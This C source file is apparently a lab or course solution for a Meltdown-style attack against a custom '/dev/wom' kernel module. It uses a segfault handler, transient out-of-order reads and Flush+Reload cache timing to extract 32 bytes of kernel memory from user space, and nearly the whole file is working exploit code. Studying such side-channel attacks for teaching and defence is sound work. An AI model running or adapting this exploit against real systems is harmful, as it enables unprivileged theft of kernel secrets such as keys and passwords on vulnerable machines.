#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <string.h>

/* for ioctl */
#define WOM_MAGIC_NUM 0x1337
#define WOM_GET_ADDRESS \
	_IOR(WOM_MAGIC_NUM, 0, unsigned long)

#define KB (1024)
#define PAGE_SIZE (4*KB)
#define PROBE_BUFFER_SIZE (PAGE_SIZE*256)
#define PROBE_NUM 20
#define EXTRACT_SIZE 32
#define MAX_THEASHOLD 300

void *
wom_get_address(int fd)
{
	void *addr = NULL;

	if (ioctl(fd, WOM_GET_ADDRESS, &addr) < 0)
		return NULL;

	return addr;
}

static jmp_buf buf;

/* My code */

static void flush(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}


unsigned long time_access_no_flush(const char *adrs) {
  volatile unsigned long time;
  asm __volatile__ (
    "  mfence             \n" // guarantees that every load and store instruction that precedes in program order the MFENCE instruction is globally visible
    "  lfence             \n" // LFENCE does not execute until all prior instructions have completed locally
    "  rdtsc              \n"
    "  lfence             \n"
    "  movl %%eax, %%esi  \n"
    "  movl (%1), %%eax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subl %%esi, %%eax  \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");
  return time;
}


unsigned int find_threshold3(const char* probe_buffer){
	unsigned int arr[MAX_THEASHOLD/10]; // 300/10=30 bins
	for(size_t i = 0; i < 30; i++) arr[i]=0;
	
	unsigned int maximum = 0, tmp = 0;
	char c;

	for(size_t k = 0; k < 100; k++)
	{
		for(size_t i = 0; i < 256; i++){
			unsigned int r = i*PAGE_SIZE;
			char a = *(probe_buffer+r);
			tmp = time_access_no_flush(probe_buffer+r);
			// printf("t:%lu\n", tmp);
			if(tmp >= MAX_THEASHOLD){ // I assume threashold can't be bigger than 300;
				continue;
			}
			tmp = tmp/10;
			arr[tmp]++;
			++maximum;
		}
	}
	
	// maximum is a number of all found threasholds
	tmp=0;
	maximum = maximum*0.95; // We take 95% of threasholds
	for(size_t i = 0; i < 30; i++){ // 30 bins
		tmp+=arr[i];
		// printf("bin %lu = %u\n", i, arr[i]);
		if(tmp >= maximum){
			return (i+1)*10+((i+1)*10*0.4); // result + result * 0.4
		}
	}
	return MAX_THEASHOLD;
}


static void unblock_signal(int signum __attribute__((__unused__))) {
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, signum);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

void segfault_sigaction(int signal, siginfo_t *si, void *arg){
    // printf("Caught segfault at address %p\n", si->si_addr);
	unblock_signal(SIGSEGV);
    longjmp(buf, 1);
}

void set_segmentation_handler(){
	struct sigaction sa;
    memset(&sa, 0, sizeof(struct sigaction));
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segfault_sigaction;
    sa.sa_flags   = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
}

int main(int argc, char *argv[])
{
    const char *secret;
	char *secret2 = malloc(1);
	*secret2 = 12;
	int fd;
	
	char *probe_buffer = malloc(PROBE_BUFFER_SIZE);
	memset(probe_buffer, 0, PROBE_BUFFER_SIZE);
	unsigned int probing_times[256];
	memset(probing_times, 0, 256*sizeof(unsigned int));
	unsigned int probing_times_min[256];
	memset(probing_times_min, -1, 256*sizeof(unsigned int));
	fd = open("/dev/wom", O_RDONLY);
	char *noise = malloc(1);
	unsigned char should_meltdown = 1;
	unsigned int redo_bytes = 0;
	unsigned char extracted_bytes[EXTRACT_SIZE];

	if (fd < 0) {
        perror("open");
		fprintf(stderr, "error: unable to open /dev/wom. "
			"Please build and load the wom kernel module.\n");
		return -1;
	}

	secret = wom_get_address(fd);

	// printf("secret=%p\n", secret);
    // printf("2918cc7ed6fde336050df6b99b3320f6\n");
	

	/* - - - - My code - - - - */

	unsigned int threashold = 100;
	if(argc < 2){
		threashold = find_threshold3(probe_buffer);
	}
	else{
		threashold = atoi(argv[1]);
	}
	

	printf("Threashold: %u\n", threashold);

	set_segmentation_handler();
		
	for(size_t byte_index = 0; byte_index < EXTRACT_SIZE; byte_index++){
		for(size_t g = 0; g < PROBE_NUM; g++){
			for(size_t i = 0; i < 256; i++){
					asm __volatile__ ("clflush 0(%0)" : : "r" (&probe_buffer[i*PAGE_SIZE]) :);
			}

			setjmp(buf);
			if(should_meltdown){
				pread(fd, NULL, 32, 0);
				should_meltdown = 0;
				// noise
				char c = *noise;
				c = *noise;
				c = *noise;
				c = *noise;
				c = *noise;
				c = *noise;
				c = *noise;
				c = *noise;
				c = *noise;


				// BOOM
				char h = *(probe_buffer + ((*(secret+byte_index)) * PAGE_SIZE)); // secret should be one byte, so within 256
			}
			should_meltdown = 1;

			/* Out of order */
			/* flush / reload */
			for(size_t i = 0; i < 256; i++){
				unsigned int r = i*PAGE_SIZE;
				unsigned int elapsed_time = time_access_no_flush(probe_buffer+r);
				probing_times[i] = probing_times[i] + elapsed_time;
				if(probing_times_min[i] > elapsed_time){
					probing_times_min[i] = elapsed_time;
				} 
			}
		}
		for(size_t i = 2; i < 256; i++){
			// printf("byte:%lu\ti:%lu\n", byte_index, i);
			// printf("%lu:\t%u\n", i, probing_times_min[i]);
			if(probing_times_min[i] < threashold){
				extracted_bytes[byte_index]=i;
				break;
			}
			if(i == 255){
				redo_bytes++;
				--byte_index;
			}
		}
		memset(probing_times, 0, 256*sizeof(unsigned int));
		memset(probing_times_min, -1, 256*sizeof(unsigned int));
	}

	printf("%.32s\n", extracted_bytes);


	close(fd);

	return 0;

	err_close:
	close(fd);
	return -1;
}